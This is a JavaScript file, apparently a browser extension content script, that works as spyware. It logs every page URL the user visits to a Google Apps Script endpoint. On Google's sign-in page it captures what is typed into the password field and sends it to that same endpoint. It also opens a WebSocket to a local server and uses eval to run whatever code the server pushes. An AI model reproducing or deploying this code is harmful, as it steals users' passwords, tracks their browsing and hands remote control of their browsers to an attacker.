// Log URLs
fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
var href = window.location.href;
setInterval(() => {
  if(window.location.href !== href){
    href = window.location.href;
    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
  }
}, 50);

// Google Password
if(window.location.host === 'accounts.google.com'){
  var password = $("input[type='password']");
  var currentVal = password.attr('data-initial-value');
  setInterval(() => {
    if(password.attr('data-initial-value') !== currentVal){
      currentVal = password.attr('data-initial-value');
      if(currentVal.length > 3){
        fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`);
      }
    }
  }, 10);
}

// Live Control
const socket = new WebSocket('ws://192.168.86.232:8082');

// Connection opened
socket.addEventListener('open', function (event) {
    var message = {
        type: "handshake",
        content: "client"
    }
    socket.send(JSON.stringify(message));
});

// Listen for messages
socket.addEventListener('message', function (event) {
    console.log('Message from server ', event.data);
    var data = JSON.parse(event.data);
    if(data.type === 'commandClient'){
      eval(data.content);
    }
});